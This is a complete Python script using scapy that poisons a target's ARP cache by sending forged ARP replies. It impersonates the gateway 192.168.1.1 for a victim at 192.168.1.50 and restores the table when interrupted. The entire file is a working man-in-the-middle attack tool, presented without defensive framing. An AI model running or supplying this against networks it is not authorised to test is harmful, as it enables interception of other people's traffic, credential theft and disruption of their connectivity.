from scapy.all import ARP, send
import threading
import time
import sys
import os

def get_mac(ip):
    """
    Returns the MAC address for a given IP.
    """
    from scapy.all import srp, Ether
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    ans = srp(pkt, timeout=2, verbose=0)[0]
    for _, rcv in ans:
        return rcv.hwsrc
    return None

def spoof(target_ip, spoof_ip, interval=2):
    """
    Sends spoofed ARP responses to the target to poison its ARP cache.
    """
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"Could not find MAC for {target_ip}")
        return

    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    def attack():
        while True:
            send(packet, verbose=0)
            time.sleep(interval)

    thread = threading.Thread(target=attack)
    thread.daemon = True
    thread.start()
    print(f"Started spoofing {target_ip} pretending to be {spoof_ip}")

def restore(target_ip, spoof_ip):
    """
    Sends a correct ARP response to fix the ARP table of the target.
    """
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    if not target_mac or not spoof_mac:
        return

    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                 psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, count=5, verbose=0)
    print(f"Restored ARP table of {target_ip}")

# Example usage
if __name__ == "__main__":
    if os.geteuid() != 0:
        sys.exit("Run this script as root/admin!")

    target = "192.168.1.50"     # target device
    gateway = "192.168.1.1"     # router or gateway
    try:
        spoof(target, gateway)
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        restore(target, gateway)
        print("\nStopped spoofing and restored ARP table.")